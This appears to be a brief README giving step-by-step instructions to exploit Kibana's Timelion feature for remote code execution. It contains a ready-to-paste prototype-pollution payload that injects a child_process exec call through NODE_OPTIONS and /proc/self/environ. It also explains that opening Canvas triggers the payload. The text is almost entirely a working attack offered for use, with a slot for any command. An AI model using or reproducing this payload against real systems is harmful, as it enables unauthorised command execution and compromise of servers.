# Quickread

**To exploit and get RCE, follow these steps:**

1. Copy and paste this code in Timelion:
	```
	.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("YOUR CMD HERE");process.exit()//')
	.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
	```
	
2. Open Canvas. This will execute the code.
